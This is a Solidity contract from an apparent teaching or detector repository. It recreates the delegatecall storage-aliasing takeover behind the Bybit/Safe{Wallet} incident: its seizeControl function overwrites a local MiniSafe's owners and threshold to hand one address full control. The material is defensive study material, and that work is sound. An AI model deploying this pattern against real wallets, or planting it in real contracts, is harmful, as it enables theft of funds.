// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title StorageWriter
/// @notice Stand-in for the "implementation" a Safe is tricked into
///         delegatecalling. In the real Bybit/Safe{Wallet} incident (Feb 2025)
///         the signers believed they were approving a routine operation; the
///         calldata actually pointed the wallet at logic that rewrote its own
///         owner/threshold storage. This contract reproduces *only* that
///         effect, against a local MiniSafe, so a detector has something
///         concrete to flag.
///
/// It declares the SAME leading storage layout as MiniSafe on purpose: when
/// MiniSafe delegatecalls `seizeControl`, these writes land in MiniSafe's slots.
/// That storage-layout aliasing is the mechanism the whole repo is teaching.
contract StorageWriter {
    // Must match MiniSafe's declared order so slots line up under delegatecall.
    address[] private _owners;            // slot 0
    mapping(address => bool) public isOwner; // slot 1
    uint256 public threshold;             // slot 2
    uint256 public nonce;                 // slot 3

    /// @notice Replace the owner set with a single address and drop threshold
    ///         to 1. After this runs in the victim's context, that address
    ///         alone controls the wallet.
    function seizeControl(address newSoleOwner) external {
        // clear the old array length, then write one entry
        while (_owners.length > 0) {
            address old = _owners[_owners.length - 1];
            isOwner[old] = false;
            _owners.pop();
        }
        _owners.push(newSoleOwner);
        isOwner[newSoleOwner] = true;
        threshold = 1;
    }
}
